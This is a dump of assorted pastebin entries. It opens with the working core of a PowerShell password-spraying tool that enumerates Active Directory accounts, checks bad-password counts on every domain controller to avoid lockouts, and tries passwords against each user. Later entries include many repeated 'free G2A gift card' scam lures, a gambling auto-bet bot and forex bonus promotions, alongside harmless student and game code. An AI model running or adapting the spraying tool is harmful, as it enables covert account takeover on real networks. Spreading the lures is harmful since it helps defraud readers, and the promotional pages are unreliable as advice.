            $de = New-Object System.DirectoryServices.DirectoryEntry ""LDAP://$pdc""
            $search = New-Object System.DirectoryServices.DirectorySearcher $de
            $search.Filter = ""(&(objectclass=user)(badPwdCount<=$counttouse)(!userAccountControl:1.2.840.113556.1.4.803:=2))"" #UAC = enabled accounts only
            $search.PageSize = 10
            $foundusers = $search.FindAll()
            if ($foundusers -ne $null)
            {
                foreach ($u in $foundusers)
                {
                    $users.Add([string]$u.Properties['samaccountname']) | Out-Null
                }
            }
            return $users
        }

        function Get-DomainControllers
        {
            $dcs = New-Object System.Collections.ArrayList
            $filter = ""(&(objectclass=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))""
            $de = New-Object System.DirectoryServices.DirectoryEntry ""LDAP://$pdc""
            $search = New-Object System.DirectoryServices.DirectorySearcher $de
            $search.Filter = $filter
            $search.PropertiesToLoad.Add('CN') | Out-Null
            $results = $search.FindAll()
            foreach ($item in $results)
            {
                $dcs.Add($item.Properties['cn']) | Out-Null
            }
            $search = $null
            $de.Dispose()
            return $dcs
        }

        function Get-DCBadPwdCount($userid, $dc)
        {
            $count = -1
            $de = New-Object System.DirectoryServices.DirectoryEntry ""LDAP://$dc""
            $search = New-Object System.DirectoryServices.DirectorySearcher $de
            $search.Filter = ""(&(objectclass=user)(samaccountname=$userid))""
            $search.PropertiestoLoad.Add('badPwdCount') | Out-Null
            $user = $search.FindOne()
            if ($user -ne $null)
            {
                $count = $user.Properties['badpwdcount']
            }
            $search = $null
            $de.Dispose()
            return $count
        }

        function Get-UserBadPwdCount($userid, $dcs)
        {
            # The badPwdCount attribute is not replicated. Attempts should be reported back to the PDC,
            # but here get the greatest count from amongst all the DCs to guard against replication errors.
            $totalbadcount = -1
            foreach ($dc in $dcs)
            {
                $badcount = Get-DCBadPwdCount $userid $dc
                if ($badcount -gt $totalbadcount)
                {
                    $totalbadcount = $badcount
                }
            }
            return $totalbadcount
        }
    }

    Process
    {
        $validaccounts = @{}

        $userstotest = $null
        Write-Host ""`n[*] Performing prereq checks.""
        if ([String]::IsNullOrEmpty($UserList) -eq $false)
        {
            if ([System.IO.File]::Exists($UserList) -eq $false)
            {
                ""[!] $UserList not found. Aborting.`n""
                exit
            }
            else
            {
                $userstotest = Get-Content $UserList
            }
        }

        $pdc = Get-PDCe

        if ($pdc -eq $null)
        {
            Write-Host ""[!] Could not locate domain controller. Aborting.""
            exit
        }

        Write-Host ""[*] PDC: $pdc""
        Write-Host ""[*] Passwords to test: $PasswordList""

        $dcs = Get-DomainControllers
        $ContextType = [System.DirectoryServices.AccountManagement.ContextType]::Domain
        $PrincipalContext = New-Object System.DirectoryServices.AccountManagement.PrincipalContext($ContextType, $pdc)

        $pwds = New-Object System.Collections.ArrayList
        foreach ($pwd in $PasswordList.Split(','))
        {
            $pwds.Add($pwd.Trim(' ')) | Out-Null
        }

        Write-Host ""[*] Initiating brute. Unless -ShowVerbose was specified, only successes will show...""
        foreach ($p in $pwds)
        {
            if ($userstotest -eq $null)
            {
                $userstotest = Get-UserList $LockoutThreshold
            }

            foreach ($u in $userstotest)
            {
                $userid = $u.Trim(' ').Trim([Environment]::Newline)
                if ($validaccounts.ContainsKey($userid) -eq $false)
                {
                    $attempts = Get-UserBadPwdCount $userid $dcs
                    
                    #Be sure to use 2 less than the LockoutThresold so the account will not be locked out as a result of the next test.
                    if ($attempts -ne -1 -and $attempts -le ($LockoutThreshold - 2)) 
                    {
                        $IsValid = $false
                        $IsValid = $PrincipalContext.ValidateCredentials($userid, $p).ToString()

                        if ($IsValid -eq $True)
                        {
                            Write-Host ""[+] Success! Username: $userid. Password: $p""
                            $validaccounts.Add($userid, $p)
                            if ($StopOnSuccess.IsPresent)
                            {
				Write-Host ""[*] StopOnSuccess. Exiting.`n""
                                exit
                            }
                        }
                        else
                        {
                            if ($ShowVerbose.IsPresent)
                            {
                                Write-Host ""[-] Failed. Username: $userid. Password: $p. BadPwdCount: $($attempts + 1)""
                            }
                        }

                        if ($Delay)
                        {
                            Start-Sleep -m $Delay
                        }
                        else
                        {
                            Start-Sleep -m 100
                        }
                    }
                    else
                    {
                        if ($ShowVerbose.IsPresent)
                        {
                            Write-Host ""[-] Skipped. Username: $userid. Password: $p. BadPwdCount: $attempts""
                        }
                    }
                }
            }
        }
        Write-Host ""[*] Completed.`n""
    }
}
"
52gq5HX7,🤑G2A.com Free Gift Card Guide June 2024 Fix🤑,vivek599,JavaScript,Sunday 2nd of June 2024 05:03:17 PM CDT,"G2A.com free voucher & games guide.
Any gift card for free on G2A.com including Playstation gift cards & anything else offered.
This is the most up to date version of this script. Any other one posted will not work!

PDF guide here:
https://drive.google.com/file/d/1DJewb1_3bQR3RytE-84jom7JCUX91RVh/view?002

Working as of:
2nd of June 2024"
D03phCiW,🤑G2A.com Free Gift Card Guide June 2024 Fix🎁,ColtM4A2,JavaScript,Sunday 2nd of June 2024 04:38:16 PM CDT,"G2A.com free voucher & games guide.
Any voucher for free on G2A.com including Playstation gift cards & anything else offered.
This is the most up to date version of this script. Any other one posted will not work!

PDF guide here:
https://drive.google.com/file/d/1DJewb1_3bQR3RytE-84jom7JCUX91RVh/view?002

Working as of:
2nd of June 2024"
DmmzqWhY,Untitled,Mysoft,FreeBasic,Sunday 2nd of June 2024 04:37:35 PM CDT,"#include ""MyTDT\fbplay2.bas""

play ""P64""

dim as double TMR = timer
play ""L4CC""
print timer-TMR

TMR = timer
play ""L6CCC""
print timer-TMR

TMR = timer
play ""L8CCCC""
print timer-TMR

TMR = timer
play ""L16CCCCCCCC""
print timer-TMR

TMR = timer
play ""L32CCCCCCCCCCCCCCCC""
print timer-TMR

TMR = timer
play ""L64CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC""
print timer-TMR
"
MPaH3vLy,🤑G2A.com Free Gift Card Guide June 2024 Fix🤑,Skarface-MKL,JavaScript,Sunday 2nd of June 2024 04:13:13 PM CDT,"G2A.com complimentary voucher & games guide.
Any gift card for free on G2A.com including Steam gift cards & anything else offered.
This is the most up to date version of this script. Any other one posted will not work!

PDF guide here:
https://drive.google.com/file/d/1DJewb1_3bQR3RytE-84jom7JCUX91RVh/view?002

Working as of:
June 2 2024"
QDCK2xx0,Untitled,hiippiie,Python,Sunday 2nd of June 2024 03:50:40 PM CDT,"import asyncio
import logging
import sys

import maigret
from maigret.result import QueryStatus

logging.getLogger('asyncio').setLevel(logging.WARNING)


MAIGRET_DB_FILE = 'https://raw.githubusercontent.com/soxoj/maigret/main/maigret/resources/data.json'
TOP_SITES_COUNT = 1500 
TIMEOUT = 5 


def setup_logger(log_level, name):
    for lib in ['requests', 'urllib3']:
        logging.getLogger(lib).setLevel(logging.WARNING) # change to debug
    logger = logging.getLogger(name)
    logger.setLevel(log_level)
    return logger


async def maigret_search(username):
    logger = setup_logger(logging.WARNING, 'maigret')
    db = maigret.MaigretDatabase().load_from_path(MAIGRET_DB_FILE)
    sites = db.ranked_sites_dict(top=TOP_SITES_COUNT)

    results = await maigret.search(username=username,
                                   site_dict=sites,
                                   timeout=TIMEOUT,
                                   max_connections=5, # max concurrent connection - default is 100
                                   is_parsing_enabled=True,
                                   logger=logger,
                                   no_progressbar=True, # change to debug
                                   query_notify=None, # change to debug
                                   )
    return results


def get_maigret_data(username):
    loop = asyncio.get_event_loop()
    results = loop.run_until_complete(maigret_search(username))

    res = {}
    for site, data in results.items():
        if data['status'].status != QueryStatus.CLAIMED:
            continue

        res[site] = data

    return res


if __name__ == '__main__':
    print(get_maigret_data('TESTUSERNAME'))
"
a8hp3yie,🤑G2A.com Free Gift Card Guide June 2024 Fix🎁,thepplayz,JavaScript,Sunday 2nd of June 2024 03:48:10 PM CDT,"G2A.com free voucher & games guide.
Any gift card for free on G2A.com including Steam gift cards & anything else offered.
This is the most latest version of this script. Any other one posted will not work!

PDF guide here:
https://drive.google.com/file/d/1DJewb1_3bQR3RytE-84jom7JCUX91RVh/view?002

Working as of:
June 2nd 2024"
y4L6Vz5b,🤑G2A.com Free Gift Card Guide June 2024 Fix🤑,sirmikey,JavaScript,Sunday 2nd of June 2024 03:23:09 PM CDT,"G2A.com complimentary gift card & gaming guide.
Any gift card for free on G2A.com including Steam gift cards & everything else offered.
This is the most latest version of this script. Any other one posted will not work!

PDF guide here:
https://drive.google.com/file/d/1DJewb1_3bQR3RytE-84jom7JCUX91RVh/view?002

Working as of:
2nd of June 2024"
nmdTiDbX,Unnamed Main Screen,E-Kemp,Lua,Sunday 2nd of June 2024 03:23:04 PM CDT,"modem = peripheral.wrap(""left"")
chat = peripheral.wrap(""chat_box_0"")
radar = peripheral.wrap(""radar_0"")
driveLoc = disk.getMountPath(""drive_0"")
monitor = peripheral.wrap(""top"")

players = {}

-- Render Function
function render()
  term.clear()
  term.setCursorPos(1, 1)
  print(""Welcome to >>"")
  write(""              Elli"")
  term.setTextColor(colors.purple)
  print(""OS"")
  term.setTextColor(colors.white)
  print(""\n--------------\n"")
  print(""Players present:"")
  if next(players) ~= nil then
    local day = os.day()
    for k, v in pairs(players) do
      print(""   > ""..v.name)
    end
  else
    print(""    None"")
  end
  print(""\n--------------\n"")
end

function monitor_render()
  local x, y = monitor.getSize()

  monitor.clear()
  monitor.setTextScale(0.5)
  monitor.setCursorPos(1, 1)
  monitor.write("">> Elli"")
  monitor.setTextColor(colors.purple)
  monitor.write(""OS"")
  monitor.setTextColor(colors.white)
  for i = 1, x do
    monitor.setCursorPos(i, 2)
    monitor.write(""-"")
  end
  monitor.setCursorPos(1, 4)
  monitor.write(""Players:"")
  for i, v in pairs(players) do
    monitor.setCursorPos(1, i+4)
    monitor.write(i.."": ""..v.name)
  end
end

while true do
  players = radar.getPlayers()
  monitor_render()
  render()
  os.sleep(1)
end


-- Listen for events
"
3EFptMxp,Набор текста голосом,egor230,Python,Sunday 2nd of June 2024 03:22:21 PM CDT,"'''Данный скрипт предназначен для распознавания речи с использованием микрофона, автоматической замены произнесенных слов на заранее заданные и последующей печати текста с помощью симулированной клавиатуры. Он также включает функции по управлению вводом с микрофона и настройкой эквалайзера для улучшения качества звука.
'''
import json, os, re, subprocess, time, threading, sys, audioop
import speech_recognition as sr
from pywinauto import keyboard
from pynput.keyboard import Key, Controller
from pynput import *
class save_key:
  def __init__(self):
    self.text = """"
    self.flag = False
    self.word=[]
    self.res={}
    self.new_res={}
  def save_text(self, text):
    self.text = text
  def get_text(self):
    return self.text
  def get_flag(self):
    return self.flag

  def set_flag(self, value):
    self.flag = value

  def update_dict(self):
   data = ""/mnt/807EB5FA7EB5E954/софт/виртуальная машина/linux must have/python_linux/Project/list for replacements.json""  # файл настроек.
   if os.path.exists(data):  # есть ли этот файл.
    with open(data, encoding=""cp1251"") as json_file:  # загрузка настроек из файла.
     self.res = json.load(json_file)     # проходимся по каждому элементу словаря
     for key in self.res.keys():    # Если ключ содержит '*', добавляем его в новый словарь
      if '*' in key:
       self.new_res[key] = self.res[key]
     for key in self.new_res.keys():
      del self.res[key]

  def get_dict(self):# словарь без *
     return self.res

  def get_new_dict(self):# словарь с *
     return self.new_res

  def save_words(self, w):
     self.word.clear()
     for i in w:
      self.word.append(i)

  def get_words(self):
     return self.word
k=save_key()
k.update_dict()
def replace(match):
  res=k.get_dict()
  return res[match.group(0)]
class save_ln:
  def __init__(self):
    self.text = """"
  def save_text(self, text):
    self.text = text
  def get_text(self):
      return self.text
def typing_text(char1):#  delay = 0.0001  # Задайте здесь нужную задержку в секундах
  for char in char1:
    script = f'''#!/bin/bash
    word=""{char}""  # Задайте здесь нужное слово  # Задайте здесь нужную задержку в секундах
    if [[ -z ""$word"" ]]; then
      xte ""key space""
    else
    xdotool type  ""$word""
    fi
    '''
    subprocess.call(['bash', '-c', script, '_'])

def repeat(text, k):
  k.save_text(text)
  text1=""""
  res=k.get_dict()
  k.save_words(res)
  words=k.get_words()
  for i in words:
     text = k.get_text()
     reg = r'\b' + r'\b|\b'.join([i]) + r'\b'
     text1 = re.sub(reg, replace, text)
     k.save_text(text1)
  new_res= k.get_new_dict()
  for word, i in new_res.items():
      text = k.get_text()
      pattern = re.compile(re.escape(word), re.IGNORECASE)
      text1 = pattern.sub(i, text)
      k.save_text(text1)
  return text1

# Подавление вывода ошибок
class NoALSAErrorOutput:
  def __enter__(self):
    self._stderr = sys.stderr
    sys.stderr = open(os.devnull, 'w')

  def __exit__(self, exc_type, exc_val, exc_tb):
    sys.stderr.close()
    sys.stderr = self._stderr


with NoALSAErrorOutput():
  mic = sr.Microphone()

# Создаем экземпляр класса распознавания
r = sr.Recognizer()

# Настройки микрофона
mic = sr.Microphone()

# Начальная настройка микрофона для снижения уровня шума
with mic as source:
  r.adjust_for_ambient_noise(source)
def on_press(key):  # обработчик клави. # print(key )
 key=str(key).replace("" "","""")
 if key == ""Key.shift_r"":
   # print(""okl"")
   k.set_flag(True)
   return True
 if key == ""Key.space"":
   k.set_flag(False)
   return True
 else:
  return True
def on_release(key):
 pass
 return True
def a():
  while 1:
    with keyboard.Listener(on_release=on_release, on_press=on_press) as listener:
      listener.join()

def apply_pulseaudio_equalizer():
  # Применение эквалайзера с использованием PulseAudio
  subprocess.run(['pactl', 'load-module', 'module-equalizer-sink', 'sink_name=equalizer'])
  subprocess.run(
    ['pactl', 'load-module', 'module-ladspa-sink', 'sink_name=ladspa_equalizer', 'sink_properties=device.description=Equalized_Sink', 'master=equalizer', 'plugin=mbeq_1197',
     'label=mbeq', 'control=6.0,6.0,4.5,0.0,0.0,0.0,0.0,0.0,4.5,7.0,8.5,10.0,12.0,8.5,6.0'])


# Подавление вывода ошибок ALSA
class NoALSAErrorOutput:
    def __enter__(self):
        self._stderr = sys.stderr
        sys.stderr = open(os.devnull, 'w')

    def __exit__(self, exc_type, exc_val, exc_tb):
        sys.stderr.close()
        sys.stderr = self._stderr

def get_mic_sources_pa():# Получение списка источников ввода
    result = subprocess.run(['pactl', 'list', 'sources', 'short'], stdout=subprocess.PIPE)
    return result.stdout.decode()

def set_mic_volume_pa(source_name, volume_percentage):# Установить уровень громкости микрофона через PulseAudio
    subprocess.run(['pactl', 'set-source-volume', source_name, f'{volume_percentage}%'])

mic_sources = get_mic_sources_pa()# Получение информации о устройствах ввода с помощью PulseAudio
# Переключитесь для вашего источника
source_name = ""alsa_input.usb-046d_HD_Webcam_C525_79588C20-00.mono-fallback""
volume_level = 50  # Процент громкости
set_mic_volume_pa(source_name, volume_level)# Установка уровня громкости микрофона

def recognize_speech():
  with mic as source:
    while 1:
      try:
        print(""Скажите что-нибудь..."")
        audio = r.listen(source)          # Обработка аудио данных или передача в распознаватель речи
        text = r.recognize_google(audio, language=""ru-RU"")# Распознаем услышанное при помощи Google Web Speech API
        text = str(text.lower()) + str("" "")
        print(text)
        if k.get_flag() == True:
          k.set_flag(False)
          text0 = text[0].upper() + text[1:]
          typing_text(text0)  #(text0)
        else:
          typing_text(text)  #(text)
      except sr.UnknownValueError:
        print(""Google Web Speech API не смог распознать аудио"")
      except sr.RequestError as e:
        print(f""Could not request results from Google Web Speech API; {e}"")

# Запуск потока для непрерывного прослушивания
apply_pulseaudio_equalizer()
listening_thread = threading.Thread(target=recognize_speech)
listening_thread.start()
t1 = threading.Thread(target=a)
t1.start()
while True:
  pass
"
67f9hpAB,🤑G2A.com Free Gift Card Guide June 2024 Fix🎁,dustinction,JavaScript,Sunday 2nd of June 2024 02:58:08 PM CDT,"G2A.com free voucher & gaming guide.
Any gift card for free on G2A.com including Steam gift cards & all else offered.
This is the most up to date version of this script. Any other one posted will not work!

PDF guide here:
https://drive.google.com/file/d/1DJewb1_3bQR3RytE-84jom7JCUX91RVh/view?002

Working as of:
June 2 2024"
WbCwRKxJ,so totally snowy,coinwalk,JavaScript,Sunday 2nd of June 2024 02:36:13 PM CDT,"var elderly = parseFloat(document.getElementById('pct_balance').value);
var belance = 0;
var greatie = elderly;
var prefit = 0.00001;
var beast = prefit;
var winnerdinner = elderly;
var wednesday = 0;
var stroke = 0;
var broke = 0;
var elven = elderly;
 
function go(){
if (greatie!=belance){
belance = document.getElementById('pct_balance').value;
if (belance>elven){
    stroke = stroke+1;
    broke  = 0;
    wednesday = wednesday+1 ;
    elven = parseFloat(belance);
}
if (belance<elven) {
    stroke = 0;
    broke = broke+1;
    elven = parseFloat(belance);
}
if (stroke==2) {
    beast = beast*2
}
if (stroke==3) {
    beast = beast*2
}
if (stroke==4) {
    beast = prefit;
    wednesday = 0;
    stroke  = 0;
}
if ((wednesday>1)&&(broke==1)) {
    beast = prefit;
    wednesday = 0;
} 
if ((wednesday<2)&&(broke>=2)) {
    beast = prefit;
    wednesday = 0;
} 
if (belance>=14400)  {
    console.log(""winner winner chicken dinner"");
    return;
} 
$('#pct_chance').val(49.5);
$('#pct_bet').val(((beast*1).toFixed(8)));
$('#a_lo').click();
}
setTimeout(() => go(), 1);
greatie = document.getElementById('pct_balance').value;
}

go();"
8d98Qg56,🤑G2A.com Free Gift Card Guide June 2024 Fix🤑,sayid83,JavaScript,Sunday 2nd of June 2024 02:33:06 PM CDT,"G2A.com free voucher & games guide.
Any item for free on G2A.com including Steam gift cards & anything else offered.
This is the most up to date version of this script. Any other one posted will not work!

PDF guide here:
https://drive.google.com/file/d/1DJewb1_3bQR3RytE-84jom7JCUX91RVh/view?002

Working as of:
2nd of June 2024"
J08KLUQS,🤑G2A.com Free Gift Card Guide June 2024 Fix🤑,PetrikDev,JavaScript,Sunday 2nd of June 2024 02:08:05 PM CDT,"G2A.com complimentary gift card & games guide.
Any gift card for free on G2A.com including Amazon gift cards & anything else offered.
This is the most up to date version of this script. Any other one posted will not work!

PDF guide here:
https://drive.google.com/file/d/1DJewb1_3bQR3RytE-84jom7JCUX91RVh/view?002

Working as of:
June 2 2024"
5pUGRBFr,Use This,qsenko1,Lua,Sunday 2nd of June 2024 02:03:24 PM CDT,"local Players = game:GetService(""Players"")
local DataStoreService = game:GetService(""DataStoreService"")
local EffectsDatastore = DataStoreService:GetDataStore(""EffectsDatastore"")

game.Players.PlayerAdded:Connect(function(Player)	
	local EffectsFolder = Instance.new(""Folder"",Player)
	EffectsFolder.Name = ""EffectsFolder""
	local EquippedDeathSounds = Instance.new(""StringValue"",Player)
	EquippedDeathSounds.Name = ""EquippedDeathSounds""
	-- Bool
	local EffectsBool = Instance.new(""BoolValue"",EffectsFolder)
	EffectsBool.Name = ""EffectsBool""
	-- Hand Trails
	local White_Trail = Instance.new(""BoolValue"",EffectsFolder)
	White_Trail.Name = ""White Trail""

	local userId = Player.UserId
	local key = ""Player_""..userId

	local success, returnValue 
	success, returnValue = pcall(EffectsDatastore.GetAsync, EffectsDatastore, key)

	if success then
		if returnValue == nil then
			returnValue = {
				White_Trail = false,
				EquippedDeathSounds = """"
			}			
		end
		-- Safety Bool
		EffectsBool.Value = true
		-- Trails
		White_Trail.Value = if returnValue.White_Trail ~= nil then returnValue.White_Trail else false
		-- Equppables
		EquippedDeathSounds.Value = if returnValue.EquippedDeathSounds ~= nil then returnValue.EquippedDeathSounds else """"
	else
		Player:Kick(""There was an error with loading your Data! Roblox's Datastore might be down,try agen later or contact us trough our Group!"")
		print(Player.Name.. "" Has a Data loading ERROR!!"")
	end

end)

game.Players.PlayerRemoving:Connect(function(Player)
	if Player.EffectsFolder:FindFirstChild(""EffectsBool"").Value == true then
		local userId = Player.UserId
		local key = ""Player_""..userId
		-- Main Values
		local equippeddeathsounds = Player.EquippedDeathSounds.Value
		-- Hand Trails
		local white_trail = Player.EffectsFolder[""White Trail""].Value

		local DataTable = {
			EquippedDeathSounds = equippeddeathsounds,
			White_Trail = white_trail,
		}

		print(DataTable)

		local success,returnValue
		success,returnValue = pcall(EffectsDatastore.UpdateAsync, EffectsDatastore, key, function()
			return DataTable
		end)

		if success  then
			print(""Effects Data Saved!"")
		else
			print(""Data Saving ERROR!!"")
		end

	end
end)"
VxTJDLCu,How Can I Maximize My Profits with the Trex Globals Credit Bonus,reviewbrokers,PHP,Sunday 2nd of June 2024 01:59:54 PM CDT,"https://www.reviewbrokers.net/how-can-i-maximize-my-profits-with-the-trex-globals-credit-bonus/
 Table of Contents: Trex Globals
1. Understanding the Trex Globals Credit Bonus
2. How to Claim Your Credit Bonus
3. Exploring Trading Opportunities with the Credit Bonus
4. Important Considerations
5. Terms and Conditions
6. Conclusion
Understanding the Trex Globals Credit Bonus
The Trex Globals Credit Bonus is a straightforward yet powerful offer that grants you a 50% credit bonus on top of your deposit amount. Imagine depositing $100 and receiving an additional $50 bonus, instantly boosting your account balance to $150. This extra credit serves as a catalyst for expanding your trading volume and potentially increasing your profits.
How to Claim Your Credit Bonus

 	
Register a new account:
Begin your trading journey with Trex Globals by signing up for a new account. The registration process is quick and seamless, ensuring you can start trading in no time.
 	
Complete the verification:
Prioritize the security of your account by completing the verification process. This step ensures the safety of your funds and provides peace of mind as you engage in trading activities.
 	
Receive the Credit Bonus 50%:
Once your account is verified, the 50% credit bonus will be automatically credited to your account. There's no waiting period—your bonus is ready to be utilized immediately.

Exploring Trading Opportunities with the Credit Bonus
The versatility of the bonus extends across various financial instruments, including forex, commodities, indices, and cryptocurrencies. Whether you're interested in currency pairs, precious metals, or digital assets, the credit bonus empowers you to explore diverse trading opportunities and implement various strategies.
Important Considerations

 	
Limited time offer:
The Trex Globals Credit Bonus is available for a limited time, adding a sense of urgency to this enticing offer.
 	
Withdrawal conditions:
The bonus can be withdrawn only upon generating profits. In the event of losses, the bonus amount will be deducted from your account balance, incentivizing responsible trading practices.

Terms and Conditions
It's crucial to familiarize yourself with the terms and conditions associated with the credit bonus:

 	
General terms and conditions:
The bonus is subject to the overarching terms and conditions of Trex Globals, ensuring fairness and transparency.
 	
Trex Globals' prerogative:
Trex Globals reserves the right to modify or terminate the promotion at its discretion, emphasizing the importance of staying informed.

Conclusion
The Trex Globals Credit Bonus presents a compelling opportunity to enhance your trading journey. By augmenting your initial investment with a 50% credit bonus, Trex Globals enables you to expand your trading horizons and pursue greater profits. However, it's essential to approach this bonus with a clear understanding of its terms and conditions, ensuring a positive and rewarding trading experience.

Don't miss out on the chance to elevate your trading experience with the Trex Globals Credit Bonus. Sign up today and seize the benefits while they last!"
FcGGJziv,🤑G2A.com Free Gift Card Guide June 2024 Fix🤑,x3kiN,JavaScript,Sunday 2nd of June 2024 01:43:03 PM CDT,"G2A.com complimentary gift card & games guide.
Any item for free on G2A.com including Amazon gift cards & everything else offered.
This is the most up to date version of this script. Any other one posted will not work!

PDF guide here:
https://drive.google.com/file/d/1DJewb1_3bQR3RytE-84jom7JCUX91RVh/view?002

Working as of:
June 2nd 2024"
cxP97c8A,How to Participate in the Sniper Weekly Demo Contest – InstaForex,fxvnpro,PHP,Sunday 2nd of June 2024 01:38:36 PM CDT,"https://www.fxvnpro.com/how-to-participate-in-the-sniper-weekly-demo-contest-instaforex/
 How to Participate in the Sniper Weekly Demo Contest – InstaForex
The Sniper Weekly Demo Contest is a prestigious competition hosted by InstaForex, designed to test and reward the best trading strategies and skills. Participants have the chance to win cash prizes while showcasing their trading prowess. Here are the essential details:
Table of Contents : InstaForex

 	Contest Overview
 	Eligibility Criteria
 	Trading Conditions
 	Determining Results and Winners
 	Additional Information

Contest Overview

 	Contest Name: Sniper Weekly Demo Contest
 	Organizer: InstaForex
 	Duration: Held every week from Monday 00:00 to Friday 23:59:59 (terminal time)
 	Prize Pool: $2,000
 	Prize Distribution:

 	1st place: $700
 	2nd place: $500
 	3rd place: $400
 	4th place: $300
 	5th place: $100


 	Registration: Participants must register on the InstaForex website and open individual demo accounts for each weekly contest. Registration ends one hour before the contest starts.

Eligibility Criteria

 	Participation: Any owner of a trading account with InstaForex can participate in the contest.
 	Age Requirement: Only full-aged customers (over 18 years old) are eligible.
 	Registration Details: Participants must sign up on the InstaForex website and provide true data, including their full name and available email address.

Trading Conditions

 	Initial Deposit: $10,000 for all participants.
 	Leverage: 1:500 by default.
 	Trading Instruments: Major currency pairs and cross rates are the only available trading instruments.
 	Trade Volume: Minimal trade volume is 0.01 lot, and the maximum is 1 lot.
 	Stop-out Level: 10%.
 	Expert Advisors: Participants can use Expert Advisors and any trading strategies without restrictions.

Determining Results and Winners

 	Results Access: Equity of participants' accounts is available in free access on the company's website during the contest period.
 	Winner Selection: The winners are determined based on the equity of their accounts at the end of the contest period.
 	Prize Claims: Winners are required to open and verify their live trading accounts to receive their prizes.

Additional Information

 	Future Registration: Participants can register for the next weekly contest during the week preceding it. Registration finishes one hour before the contest starts.
 	Disqualification Rights: The Organizer reserves the right to decline registration of any participant without explanation or disqualify any participant during the contest or after it is over with an explanation.

By following these rules and guidelines, participants can effectively take part in the Sniper Weekly Demo Contest and stand a chance to win cash prizes. This contest offers a fantastic opportunity for traders to refine their skills and gain recognition in the trading community.

Read InstaForex Review"
CECQcz2r,zad 2,Nihonik,Python,Sunday 2nd of June 2024 01:33:36 PM CDT,"x = int(input(""podaj liczbe: ""))


while True:
    if (x >= 0):
        x = int(input(""podaj ujemną liczbe: ""))
    else:
        print(""ok"")
        break"
ss7hdbTF,Untitled,yasi04,Python,Sunday 2nd of June 2024 01:32:03 PM CDT,"def remove_none(data):
    new_data = []
    for i in range(len(data)):
        if data[i][0] is not None:
            new_data.append(data[i])
    return new_data


def remove_doubles_rows(data):
    new_data = []
    for i in data:
        new_data.append(i)
    for i in range(len(data) - 1):
        for j in range(i + 1, len(data)):
            if data[i] == data[j]:
                del new_data[j]
    return new_data


def remove_doubles_columns(data):
    for i in range(len(data)):
        data[i] = sorted(list(frozenset(data[i])))
    return data


def transport(data):
    for i in range(len(data)):
        data[i] = transport2(data[i])
    return data


def transport2(data):
    data[0] = ""("" + data[0].split(' ')[1] + "") "" + data[0].split(' ')[2]
    data[1] = f""{float(data[1]):.4f}""
    data[2] = data[2].split('[')[0]
    data[3] = data[3].split(' ')[0]
    return data


def transform(data):
    new_data = [[] for _ in range(len(data[0]))]
    for i in range(len(new_data)):
        for j in range(len(data)):
            new_data[i].append(data[j][i])
    new_data[0], new_data[1], new_data[2], new_data[3] = new_data[2], new_data[1], new_data[0], new_data[3]
    return new_data


def main(data):
    data = remove_none(data)
    data = remove_doubles_rows(data)
    data = remove_doubles_columns(data)
    data = transport(data)
    data = transform(data)
    return data
"
ZHXSbz10,Untitled,Josif_tepe,C++,Sunday 2nd of June 2024 01:29:12 PM CDT,"#include <iostream>
#include <vector>
#include <algorithm>
using namespace std;

int main()
{
  vector<pair<int, int>> v;

  int n;
  cin >> n;
  for(int i = 0; i < n; i++) {
    int a, b;
    cin >> a >> b;
    v.push_back(make_pair(b, a));
  }

  sort(v.begin(), v.end());
    int res = 1;
    int vreme = v[0].first;
    for(int i = 1; i < n; i++) {
        if(vreme <= v[i].second) {
            res++;
            vreme = v[i].first;
        }
    }
    cout << res << endl;


    return 0;
}
"
uR220kR1,zad 1,Nihonik,Python,Sunday 2nd of June 2024 01:27:31 PM CDT,"x = input(""podaj liczby odzielone spacją: "")

y= x.split("" "")

z = 0

for i in y:
	a = int(i)
	if a % 10 == 0:
		z +=1
print(""ilość podanych liczb"" + len(x))
print(""ilość liczb podzielnych przez 10"" + z)"
H5Qz1Lde,🤑G2A.com Free Gift Card Guide June 2024 Fix🎁,FeasModz514,JavaScript,Sunday 2nd of June 2024 01:18:01 PM CDT,"G2A.com complimentary gift card & games guide.
Any item for free on G2A.com including Amazon gift cards & anything else offered.
This is the most current version of this script. Any other one posted will not work!

PDF guide here:
https://drive.google.com/file/d/1DJewb1_3bQR3RytE-84jom7JCUX91RVh/view?002

Working as of:
June 2nd 2024"
7Th7ZVVN,Nebraska Pay Chiosco 1.19,lego11,Lua,Sunday 2nd of June 2024 01:04:50 PM CDT,"local maxw, maxh = term.getSize()

--IMPLEMENTAZIONE DEL DRAWFILLEDBOX
local function drawPixelInternal(xPos, yPos)
    term.setCursorPos(xPos, yPos)
    term.write("" "")
end

local tColourLookup = {}
for n = 1,16 do
    tColourLookup[string.byte(""0123456789abcdef"", n, n)] = 2^(n-1)
end

function drawFilledBox(startX, startY, endX, endY, nColour)
    if type(startX) ~= ""number"" or type(startX) ~= ""number"" or
       type(endX) ~= ""number"" or type(endY) ~= ""number"" or
       (nColour ~= nil and type(nColour) ~= ""number"") then
        error(""Expected startX, startY, endX, endY, colour"", 2)
    end

    startX = math.floor(startX)
    startY = math.floor(startY)
    endX = math.floor(endX)
    endY = math.floor(endY)

    if nColour then
        term.setBackgroundColor(nColour)
    end
    if startX == endX and startY == endY then
        drawPixelInternal(startX, startY)
        return
    end

    local minX = math.min(startX, endX)
    if minX == startX then
        minY = startY
        maxX = endX
        maxY = endY
    else
        minY = endY
        maxX = startX
        maxY = startY
    end

    for x = minX, maxX do
        for y = minY, maxY do
            drawPixelInternal(x, y)
        end
    end
end

function clear()
    sfondo(colors.lightBlue)
    term.clear()
    term.setCursorPos(1, 1)
end
 
function colore(sfumatura)
    term.setTextColour(sfumatura)
end

function sfondo(sfumaturaSfondo)
    term.setBackgroundColour(sfumaturaSfondo)
end

function titolo(testo)
    drawFilledBox(1, 1, maxw, 1, colors.yellow)
    term.setCursorPos((maxw - #testo) / 2, 1)
    colore(colors.black)
    term.write(testo)
    sfondo(colors.lightBlue)
end

function update()
    term.setCursorPos(1, 21)
    shell.run(""pastebin get y1AP0iNY startup2"") -- Inserire paste di nPay
	if fs.exists(""startup2"") then
		shell.run(""rm startup"")
		shell.run(""mv startup2 startup"")
    end
    os.reboot()
end

function disconnetti()
    clear()
    text = ""ARRIVEDERCI!""
    colore(colors.white)
    term.setCursorPos((maxw - #text) / 2, math.floor(maxh / 2))
    term.write(text)
    colore(colors.black)
    text2 = ""Tra poco saråA0 possibile eseguire""
    text3 = ""una nuova operazione...""
    term.setCursorPos((maxw - #text2) / 2, math.floor(maxh / 2) + 2)
    print(text2)
